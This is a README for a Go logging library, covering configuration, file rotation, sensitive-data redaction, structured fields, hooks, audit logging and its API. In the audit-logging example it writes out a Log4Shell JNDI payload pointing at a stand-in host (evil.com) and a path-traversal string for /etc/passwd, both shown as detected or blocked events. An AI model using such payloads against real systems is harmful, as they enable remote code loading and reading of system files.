# DD - High-Performance Go Logging Library

[![Go Version](https://img.shields.io/badge/Go-1.25+-00ADD8?style=flat&logo=go)](https://go.dev/)
[![Documentation](https://img.shields.io/badge/docs-cybergo.dev-blue.svg)](https://www.cybergo.dev/dd)
[![pkg.go.dev](https://pkg.go.dev/badge/github.com/cybergodev/dd.svg)](https://pkg.go.dev/github.com/cybergodev/dd)
[![License](https://img.shields.io/badge/license-MIT-brightgreen.svg)](LICENSE)
[![Security](https://img.shields.io/badge/security-policy-blue.svg)](SECURITY.md)

A production-grade high-performance Go logging library with zero external dependencies, designed for modern cloud-native applications.

 **[中文文档](README_zh-CN.md)** | **[www.cybergo.dev/dd](https://www.cybergo.dev/dd)**

---

## Key Features

| Feature | Description |
|---------|-------------|
| **High Performance** | Minimal allocations (1/op simple logging), buffer pooling, lock-free reads |
| **Thread-Safe** | Atomic operations + lock-free design, fully concurrent-safe |
| **Built-in Security** | Sensitive data filtering, injection attack prevention |
| **Structured Logging** | Type-safe fields, JSON/text formats, customizable field names |
| **Smart Rotation** | Auto-rotate by size, auto-compress, auto-cleanup |
| **Zero Dependencies** | Only Go standard library |
| **Easy to Use** | Get started in 30 seconds with intuitive API |
| **Cloud-Native** | JSON format compatible with ELK/Splunk/CloudWatch |

---

## Installation

```bash
go get github.com/cybergodev/dd
```

**Requirements:** Go 1.25+

---

## Quick Start

### 30-Second Setup

```go
package main

import "github.com/cybergodev/dd"

func main() {
    // Zero setup - use package-level functions
    dd.Debug("Debug message")
    dd.Info("Application started")
    dd.Warn("Cache miss")
    dd.Error("Connection failed")
    // dd.Fatal("Critical error")  // Calls os.Exit(1)

    // Structured logging with fields
    dd.InfoWith("Request processed",
        dd.String("method", "GET"),
        dd.Int("status", 200),
        dd.Float64("duration_ms", 45.67),
    )
}
```

### File Logging

```go
package main

import (
    "log"

    "github.com/cybergodev/dd"
)

func main() {
    // Configure file output with rotation
    cfg := dd.DefaultConfig()
    cfg.Targets = []dd.OutputTarget{dd.FileOutput("logs/app.log")}

    logger, err := dd.New(cfg)
    if err != nil {
        log.Fatalf("failed to create logger: %v", err)
    }
    defer logger.Close()

    logger.Info("Application started")
    logger.InfoWith("User login",
        dd.String("user_id", "12345"),
        dd.String("ip", "192.168.1.100"),
    )
}
```

---

## Configuration

### Preset Configurations

```go
// Production (default) - Info level, text format
logger, err := dd.New(dd.DefaultConfig())

// Development - Debug level, caller info
logger, err := dd.New(dd.DevelopmentConfig())

// Cloud-native - JSON format, debug level
logger, err := dd.New(dd.JSONConfig())
```

### Custom Configuration

```go
cfg := dd.DefaultConfig()
cfg.Level = dd.LevelDebug
cfg.Format = dd.FormatJSON
cfg.DynamicCaller = true  // Show caller file:line

// File output with rotation
fileTarget := dd.FileOutput("logs/app.log")
fileTarget.MaxSizeMB = 100              // Rotate at 100MB
fileTarget.MaxBackups = 10              // Keep 10 backups
fileTarget.MaxAge = 30 * 24 * time.Hour // Delete after 30 days
fileTarget.Compress = true              // Gzip old files
cfg.Targets = []dd.OutputTarget{fileTarget}

logger, err := dd.New(cfg)
if err != nil {
    log.Fatalf("failed to create logger: %v", err)
}
defer logger.Close()
```

### Output Targets

The `Targets` field controls where log output goes. Use the helper constructors:

```go
cfg := dd.DefaultConfig()
cfg.Targets = []dd.OutputTarget{
    dd.ConsoleOutput(),                  // stdout
    dd.FileOutput("logs/app.log"),       // file with rotation
    dd.CustomOutput(customWriter),       // any io.Writer
}
logger, err := dd.New(cfg)
```

### Configure Package-Level Functions

The package-level functions (`dd.Debug()`, `dd.Info()`, etc.) use a default logger. Use `InitDefault()` to customize its behavior:

```go
package main

import "github.com/cybergodev/dd"

func main() {
    // Configure the default logger for package-level functions
    cfg := dd.DefaultConfig()
    cfg.Level = dd.LevelDebug
    cfg.DynamicCaller = false  // Disable caller file:line output

    if err := dd.InitDefault(cfg); err != nil {
        panic(err)
    }

    // Now these use your configuration
    dd.Debug("Debug message")      // No caller info
    dd.Info("Application started") // No caller info

    // Re-enable caller info
    cfg.DynamicCaller = true
    dd.InitDefault(cfg)

    dd.Info("With caller info")    // Shows file:line
}
```

### JSON Customization

```go
cfg := dd.JSONConfig()
cfg.JSON.FieldNames = &dd.JSONFieldNames{
    Timestamp: "@timestamp",  // ELK standard
    Level:     "severity",
    Message:   "msg",
    Caller:    "source",
    Fields:    "attributes",   // Custom name for structured fields
}
cfg.JSON.PrettyPrint = true  // For development

logger, err := dd.New(cfg)
if err != nil {
    log.Fatalf("failed to create logger: %v", err)
}
```

---

## Security Features

### Sensitive Data Filtering

```go
cfg := dd.DefaultConfig()
cfg.Security = dd.DefaultSecurityConfig()  // Enable basic filtering

logger, err := dd.New(cfg)
if err != nil {
    log.Fatalf("failed to create logger: %v", err)
}

// Automatic filtering (basic — DefaultSecurityConfig)
logger.Info("password=secret123")           // -> password=[REDACTED]
logger.Info("api_key=sk-abc123")            // -> api_key=[REDACTED]
logger.Info("credit_card=4532015112830366") // -> credit_card=[REDACTED]
// Email addresses require full filtering: cfg.Security = dd.DefaultSecureConfig()
```

| Security Level | Filter Type | Coverage |
|----------------|-------------|----------|
| `DefaultSecurityConfig()` | Basic | Passwords, API keys, credit cards, phone numbers, database URLs |
| `DefaultSecureConfig()` | Full | All built-in patterns: JWTs, AWS keys, IPs, SSNs, emails, and more |
| `HealthcareConfig()` | HIPAA | Full + PHI patterns (diagnosis codes, MRNs) |
| `FinancialConfig()` | PCI-DSS | Full + financial data (SWIFT, IBAN, CVV, routing numbers) |
| `GovernmentConfig()` | Government | Full + classified patterns (passports, licenses, case numbers) |

Or use `SecurityConfigForLevel()` for programmatic selection:

```go
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelDevelopment) // No filtering
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelBasic)       // Basic
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelStandard)    // Standard
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelStrict)      // Strict
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelParanoid)    // Maximum
```

### Custom Patterns

```go
filter := dd.NewEmptySensitiveDataFilter()
filter.AddPatterns(
    `(?i)internal_token[:\s=]+[^\s]+`,
    `(?i)session_id[:\s=]+[^\s]+`,
)

cfg := dd.DefaultConfig()
cfg.Security = &dd.SecurityConfig{
    SensitiveFilter: filter,
}
logger, err := dd.New(cfg)
if err != nil {
    log.Fatalf("failed to create logger: %v", err)
}
```

### Disable Security (Max Performance)

```go
cfg := dd.DefaultConfig()
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelDevelopment)
```

---

## Structured Logging

### Field Types

```go
logger.InfoWith("All field types",
    dd.String("user", "alice"),
    dd.Int("count", 42),
    dd.Int64("id", 9876543210),
    dd.Float64("score", 98.5),
    dd.Bool("active", true),
    dd.Time("created_at", time.Now()),
    dd.Duration("elapsed", 150*time.Millisecond),
    dd.Err(errors.New("connection failed")),
    dd.ErrWithStack(errors.New("critical error")), // Include stack trace
    dd.Any("tags", []string{"vip", "premium"}),
)
```

### Field Chaining

```go
// Create logger with persistent fields
userLogger := logger.WithFields(
    dd.String("service", "user-api"),
    dd.String("version", "1.0.0"),
)

// All logs include service and version
userLogger.Info("User authenticated")
userLogger.InfoWith("Profile loaded", dd.String("user_id", "123"))

// Chain more fields
requestLogger := userLogger.WithFields(
    dd.String("request_id", "req-abc-123"),
)
requestLogger.Info("Processing request")
```

---

## Output Management

### Multiple Outputs

```go
// Console + file using Targets
cfg := dd.DefaultConfig()
cfg.Targets = []dd.OutputTarget{
    dd.ConsoleOutput(),
    dd.FileOutput("logs/app.log"),
}
logger, err := dd.New(cfg)

// Or use MultiWriter for advanced scenarios
fileWriter, err := dd.NewFileWriter("logs/app.log", dd.DefaultFileWriterConfig())
if err != nil { /* handle error */ }

multiWriter := dd.NewMultiWriter(os.Stdout, fileWriter)

cfg := dd.DefaultConfig()
cfg.Targets = []dd.OutputTarget{dd.CustomOutput(multiWriter)}
logger, err := dd.New(cfg)
```

### Buffered Writes (High Throughput)

```go
fileWriter, err := dd.NewFileWriter("logs/app.log", dd.DefaultFileWriterConfig())
if err != nil { /* handle error */ }

bufferedWriter, err := dd.NewBufferedWriter(fileWriter, dd.DefaultBufferedWriterConfig())
if err != nil { /* handle error */ }
defer bufferedWriter.Close()  // IMPORTANT: Flush on close

cfg := dd.DefaultConfig()
cfg.Targets = []dd.OutputTarget{dd.CustomOutput(bufferedWriter)}
logger, err := dd.New(cfg)
```

### Dynamic Writer Management

```go
logger, err := dd.New()
if err != nil { /* handle error */ }

fileWriter, err := dd.NewFileWriter("logs/dynamic.log", dd.DefaultFileWriterConfig())
if err != nil { /* handle error */ }

logger.AddWriter(fileWriter)        // Add at runtime
logger.RemoveWriter(fileWriter)     // Remove at runtime

fmt.Printf("Writers: %d\n", logger.WriterCount())
```

---

## Context & Tracing

### Context Keys

```go
ctx := context.Background()
ctx = dd.WithTraceID(ctx, "trace-abc123")
ctx = dd.WithSpanID(ctx, "span-def456")
ctx = dd.WithRequestID(ctx, "req-789xyz")

// Pattern 1: Extract context values and pass to WithFields
entry := logger.WithFields(
    dd.String("trace_id", dd.GetTraceID(ctx)),
    dd.String("span_id", dd.GetSpanID(ctx)),
)
entry.InfoWith("Processing request", dd.String("user", "alice"))

// Pattern 2: Use helper function for extraction
func extractTraceFields(ctx context.Context) []dd.Field {
    var fields []dd.Field
    if traceID := dd.GetTraceID(ctx); traceID != "" {
        fields = append(fields, dd.String("trace_id", traceID))
    }
    if spanID := dd.GetSpanID(ctx); spanID != "" {
        fields = append(fields, dd.String("span_id", spanID))
    }
    return fields
}

traceFields := extractTraceFields(ctx)
logger.InfoWith("User action", append(traceFields,
    dd.String("action", "login"),
)...)
```

> **Note:** Always use a valid parent context (e.g., `context.Background()`), never `nil`.

### Custom Context Extractors

```go
tenantExtractor := func(ctx context.Context) []dd.Field {
    if tenantID := ctx.Value("tenant_id"); tenantID != nil {
        return []dd.Field{dd.String("tenant_id", tenantID.(string))}
    }
    return nil
}

cfg := dd.DefaultConfig()
cfg.ContextExtractors = []dd.ContextExtractor{tenantExtractor}
logger, err := dd.New(cfg)
```

---

## Hooks

```go
hooks := dd.NewHooksFromConfig(dd.HooksConfig{
    BeforeLog: []dd.Hook{
        func(ctx context.Context, hctx *dd.HookContext) error {
            fmt.Printf("Before: %s\n", hctx.Message)
            return nil
        },
    },
    AfterLog: []dd.Hook{
        func(ctx context.Context, hctx *dd.HookContext) error {
            fmt.Printf("After: %s\n", hctx.Message)
            return nil
        },
    },
    OnError: []dd.Hook{
        func(ctx context.Context, hctx *dd.HookContext) error {
            fmt.Printf("Error: %v\n", hctx.Error)
            return nil
        },
    },
})

cfg := dd.DefaultConfig()
cfg.Hooks = hooks
logger, err := dd.New(cfg)
```

---

## Audit Logging

### Audit Events

```go
// Create audit logger (default output is os.Stderr)
auditCfg := dd.DefaultAuditConfig()
auditCfg.JSONFormat = true

auditLogger, err := dd.NewAuditLogger(auditCfg)
if err != nil { /* handle error */ }
defer auditLogger.Close()

// Log security events
auditLogger.LogSensitiveDataRedaction("password=*", "password", "Password redacted")
auditLogger.LogPathTraversalAttempt("../../../etc/passwd", "Path traversal blocked")
auditLogger.LogSecurityViolation("LOG4SHELL", "Pattern detected", map[string]any{
    "input": "${jndi:ldap://evil.com/a}",
})
```

### Log Integrity

```go
// Create signer with auto-generated secret key
integrityCfg, err := dd.DefaultIntegrityConfigSafe()
if err != nil { /* handle error */ }

signer, err := dd.NewIntegritySigner(integrityCfg)
if err != nil { /* handle error */ }

// Sign log messages
message := "Critical audit event"
signature := signer.Sign(message)
fmt.Printf("Signed: %s %s\n", message, signature)

// Verify signature
result, err := signer.Verify(message + " " + signature)
if err == nil && result.Valid {
    fmt.Println("Signature valid")
}
```

---

## Testing

### LoggerRecorder

Use `LoggerRecorder` to capture and assert log output in tests:

```go
recorder := dd.NewLoggerRecorder()

// Create a logger that writes to the recorder
logger, err := recorder.NewLogger()
if err != nil { /* handle error */ }

logger.InfoWith("User login",
    dd.String("user_id", "123"),
    dd.String("action", "login"),
)

// Assert on captured entries
fmt.Printf("Total entries: %d\n", recorder.Count())           // 1
fmt.Printf("Has entries: %v\n", recorder.HasEntries())         // true

// Inspect the last entry
entry := recorder.LastEntry()
fmt.Printf("Level: %v\n", entry.Level)      // Info
fmt.Printf("Message: %s\n", entry.Message)  // "User login"

// Search entries
recorder.ContainsMessage("User login")          // true
recorder.ContainsField("user_id")               // true
recorder.GetFieldValue("user_id")               // "123"
recorder.EntriesAtLevel(dd.LevelInfo)           // []LogEntry{...}
```

---

## Advanced Features

### Log Sampling

Reduce log volume in high-throughput scenarios:

```go
cfg := dd.DefaultConfig()
cfg.Sampling = &dd.SamplingConfig{
    Enabled:    true,
    Initial:    100,              // Always log first 100 messages
    Thereafter: 10,               // Then log 1 in every 10
    Tick:       time.Second,      // Reset counters every second
}
logger, err := dd.New(cfg)
```

### Field Validation

Enforce naming conventions on field keys:

```go
// Strict snake_case validation
logger.SetFieldValidation(dd.StrictSnakeCaseConfig())

// Custom validation
fv := &dd.FieldValidationConfig{
    Mode:                     dd.FieldValidationStrict,
    Convention:               dd.NamingConventionSnakeCase,
    AllowCommonAbbreviations: true,
}
logger.SetFieldValidation(fv)
```

### Dynamic Level Resolution

Adjust log levels at runtime based on conditions:

```go
var errorCount atomic.Int64

logger.SetLevelResolver(func(ctx context.Context) dd.LogLevel {
    if errorCount.Load() > 100 {
        return dd.LevelWarn  // Reduce logging under high error rate
    }
    return dd.LevelDebug
})
```

### Graceful Shutdown

Use `Shutdown` for clean shutdown with timeout:

```go
logger, _ := dd.New(dd.DefaultConfig())
defer func() {
    ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
    defer cancel()
    if err := logger.Shutdown(ctx); err != nil {
        fmt.Fprintf(os.Stderr, "Logger shutdown error: %v\n", err)
    }
}()
```

### Debug Utilities

Quick data inspection (writes to stdout, no security filtering):

```go
dd.Text(myStruct)                      // Pretty-printed output
dd.Textf("Value: %v", data)            // Formatted text
dd.JSON(myStruct)                      // JSON with caller info
dd.JSONF("Result: %v", data)           // Formatted JSON

// Also available on logger instances
logger.Text(myStruct)
logger.JSON(myStruct)
```

---

## Performance

| Operation | Throughput | Memory/Op | Allocs/Op |
|-----------|------------|-----------|-----------|
| Simple Logging | ~490K ops/sec | 64 B | 1 |
| Structured (3 fields) | ~270K ops/sec | 241 B | 4 |
| JSON Format | ~295K ops/sec | 225 B | 3 |
| Level Check | ~360M ops/sec | 0 B | 0 |
| Concurrent (22 goroutines) | ~4.3M ops/sec | 80 B | 1 |

> Benchmarks use default config (security filtering enabled) writing to
> `io.Discard`; measured on Intel Core Ultra 9. `Memory/Op` and
> `Allocs/Op` are deterministic; throughput varies by hardware. Run
> `go test -bench=. -benchmem` to reproduce.

**Optimization Tips:**
- Use `IsLevelEnabled()` before expensive operations: `if logger.IsDebugEnabled() { ... }`
- Enable buffered writes for high-throughput scenarios
- Disable security filtering in trusted environments

---

## API Reference

### Log Levels

| Constant | Value | Description |
|----------|-------|-------------|
| `dd.LevelDebug` | 0 | Detailed diagnostic info |
| `dd.LevelInfo` | 1 | General operational messages (default) |
| `dd.LevelWarn` | 2 | Warning conditions |
| `dd.LevelError` | 3 | Error conditions |
| `dd.LevelFatal` | 4 | Severe errors (calls os.Exit(1)) |

### Package-Level Functions

```go
// Simple logging
dd.Debug(args ...any)
dd.Info(args ...any)
dd.Warn(args ...any)
dd.Error(args ...any)
dd.Fatal(args ...any)  // Calls os.Exit(1)

// Formatted logging
dd.Debugf(format string, args ...any)
dd.Infof(format string, args ...any)
dd.Warnf(format string, args ...any)
dd.Errorf(format string, args ...any)
dd.Fatalf(format string, args ...any)

// Structured logging
dd.InfoWith(msg string, fields ...dd.Field)
dd.ErrorWith(msg string, fields ...dd.Field)
// ... DebugWith, WarnWith, FatalWith

// Global logger management
dd.InitDefault(cfg ...Config) error  // Initialize default logger with config
dd.SetDefault(logger *Logger)
dd.Default() *Logger                 // Get default logger
dd.DefaultWithErr() (*Logger, error) // Get default logger with init error
dd.DefaultInitError() error          // Check if default init failed
dd.SetLevel(level LogLevel) error
dd.GetLevel() LogLevel

// Generic level logging
dd.Log(level LogLevel, args ...any)
dd.Logf(level LogLevel, format string, args ...any)
dd.LogWith(level LogLevel, msg string, fields ...Field)

// Level check functions
dd.IsLevelEnabled(level LogLevel) bool
dd.IsDebugEnabled()  // + IsInfoEnabled, IsWarnEnabled, IsErrorEnabled, IsFatalEnabled

// Print functions (filtered, uses LevelInfo)
dd.Print(args ...any)
dd.Println(args ...any)
dd.Printf(format string, args ...any)

// Field chaining (package-level)
dd.WithFields(fields ...Field) *LoggerEntry
dd.WithField(key string, value any) *LoggerEntry

// Sampling
dd.SetSampling(config *SamplingConfig)
dd.GetSampling() *SamplingConfig

// Lifecycle
dd.Flush() error
dd.AddWriter(w io.Writer) error
dd.RemoveWriter(w io.Writer) error
dd.WriterCount() int
```

### Logger Methods

```go
logger, err := dd.New()

// Simple logging
logger.Info(args ...any)
logger.Infof(format string, args ...any)
logger.InfoWith(msg string, fields ...Field)

// Generic level logging
logger.Log(level LogLevel, args ...any)
logger.Logf(level LogLevel, format string, args ...any)
logger.LogWith(level LogLevel, msg string, fields ...Field)

// Print methods (filtered, uses LevelInfo)
logger.Print(args ...any)
logger.Println(args ...any)
logger.Printf(format string, args ...any)

// Level management
logger.SetLevel(level LogLevel) error
logger.GetLevel() LogLevel
logger.IsLevelEnabled(level LogLevel) bool
logger.IsDebugEnabled() bool    // + IsInfoEnabled, IsWarnEnabled, IsErrorEnabled, IsFatalEnabled
logger.SetLevelResolver(resolver LevelResolver)
logger.GetLevelResolver() LevelResolver

// Writer management
logger.AddWriter(w io.Writer) error
logger.RemoveWriter(w io.Writer) error
logger.WriterCount() int

// Lifecycle
logger.Flush() error
logger.Close() error
logger.Shutdown(ctx context.Context) error  // Graceful shutdown with timeout
logger.IsClosed() bool

// Field chaining
logger.WithFields(fields ...Field) *LoggerEntry
logger.WithField(key string, value any) *LoggerEntry

// Security
logger.SetSecurityConfig(config *SecurityConfig)
logger.GetSecurityConfig() *SecurityConfig
logger.ActiveFilterGoroutines() int32
logger.WaitForFilterGoroutines(timeout time.Duration) bool

// Context extractors
logger.AddContextExtractor(extractor ContextExtractor) error
logger.SetContextExtractors(extractors ...ContextExtractor) error
logger.GetContextExtractors() []ContextExtractor

// Hooks
logger.AddHook(event HookEvent, hook Hook) error
logger.SetHooks(registry *HookRegistry) error
logger.GetHooks() *HookRegistry

// Sampling
logger.SetSampling(config *SamplingConfig)
logger.GetSampling() *SamplingConfig

// Field validation
logger.SetFieldValidation(config *FieldValidationConfig)
logger.GetFieldValidation() *FieldValidationConfig
```

### Field Constructors

```go
dd.String(key, value string)
dd.Int(key string, value int)
dd.Int8(key string, value int8)
dd.Int16(key string, value int16)
dd.Int32(key string, value int32)
dd.Int64(key string, value int64)
dd.Uint(key string, value uint)
dd.Uint8(key string, value uint8)
dd.Uint16(key string, value uint16)
dd.Uint32(key string, value uint32)
dd.Uint64(key string, value uint64)
dd.Float32(key string, value float32)
dd.Float64(key string, value float64)
dd.Bool(key string, value bool)
dd.Time(key string, value time.Time)
dd.Duration(key string, value time.Duration)
dd.Err(err error)                    // Error field (key: "error")
dd.ErrWithKey(key string, err error) // Error field with custom key
dd.ErrWithStack(err error)           // Error with stack trace
dd.Any(key string, value any)        // Any type
```

### Output Target Helpers

| Helper | Description |
|--------|-------------|
| `dd.ConsoleOutput()` | Stdout output |
| `dd.FileOutput(path)` | File output with rotation |
| `dd.CustomOutput(w)` | Custom io.Writer |

### Context Functions

```go
// Set context values
dd.WithTraceID(ctx context.Context, id string) context.Context
dd.WithSpanID(ctx context.Context, id string) context.Context
dd.WithRequestID(ctx context.Context, id string) context.Context

// Get context values
dd.GetTraceID(ctx context.Context) string
dd.GetSpanID(ctx context.Context) string
dd.GetRequestID(ctx context.Context) string
```

### Interfaces for Dependency Injection

```go
// CoreLogger - basic logging methods
type CoreLogger interface {
    Debug/Info/Warn/Error/Fatal(args ...any)
    Debugf/Infof/Warnf/Errorf/Fatalf(format string, args ...any)
    DebugWith/InfoWith/WarnWith/ErrorWith/FatalWith(msg string, fields ...Field)
    WithFields(fields ...Field) *LoggerEntry
    WithField(key string, value any) *LoggerEntry
}

// LevelLogger - adds level management
type LevelLogger interface {
    CoreLogger
    GetLevel() LogLevel
    SetLevel(level LogLevel) error
    IsLevelEnabled(level LogLevel) bool
    IsDebugEnabled() bool  // + IsInfoEnabled, IsWarnEnabled, IsErrorEnabled, IsFatalEnabled
}

// ConfigurableLogger - adds writer, lifecycle, and configuration methods
type ConfigurableLogger interface {
    CoreLogger
    GetLevel() LogLevel
    SetLevel(level LogLevel) error
    AddWriter(writer io.Writer) error
    RemoveWriter(writer io.Writer) error
    WriterCount() int
    Flush() error
    Close() error
    IsClosed() bool
    SetSecurityConfig(config *SecurityConfig)
    GetSecurityConfig() *SecurityConfig
    SetWriteErrorHandler(handler WriteErrorHandler)
    AddContextExtractor(extractor ContextExtractor) error
    SetContextExtractors(extractors ...ContextExtractor) error
    GetContextExtractors() []ContextExtractor
    AddHook(event HookEvent, hook Hook) error
    SetHooks(registry *HookRegistry) error
    GetHooks() *HookRegistry
    SetSampling(config *SamplingConfig)
    GetSampling() *SamplingConfig
}

// LogProvider - full interface for DI/testing (includes Print/Text/JSON debug methods)
type LogProvider interface {
    // Includes all CoreLogger, LevelLogger, ConfigurableLogger methods
    // Plus debug utilities: Print/Println/Printf, Text/Textf, JSON/JSONF
    // Plus filter goroutine monitoring: ActiveFilterGoroutines/WaitForFilterGoroutines
}

// Usage in services:
type Service struct {
    logger dd.LogProvider
}
```

---

## Examples

See the [examples](examples) directory for complete, runnable examples:

| File | Description |
|------|-------------|
| [01_quick_start.go](examples/01_quick_start.go) | Basic usage in 5 minutes |
| [02_structured_logging.go](examples/02_structured_logging.go) | Type-safe fields, WithFields |
| [03_configuration.go](examples/03_configuration.go) | Config API, presets, rotation |
| [04_security.go](examples/04_security.go) | Filtering, custom patterns |
| [05_writers.go](examples/05_writers.go) | File, buffered, multi-writer |
| [06_context_hooks.go](examples/06_context_hooks.go) | Tracing, hooks |
| [07_convenience.go](examples/07_convenience.go) | Output targets, quick setup |
| [08_production.go](examples/08_production.go) | Production patterns |
| [09_advanced.go](examples/09_advanced.go) | Sampling, validation |
| [10_audit_integrity.go](examples/10_audit_integrity.go) | Audit, integrity |
| [11_testing.go](examples/11_testing.go) | Testing with LoggerRecorder |

Run examples with the `examples` build tag:

```bash
go run -tags examples examples/01_quick_start.go
```

---

## License

MIT License - see [LICENSE](LICENSE) file for details.
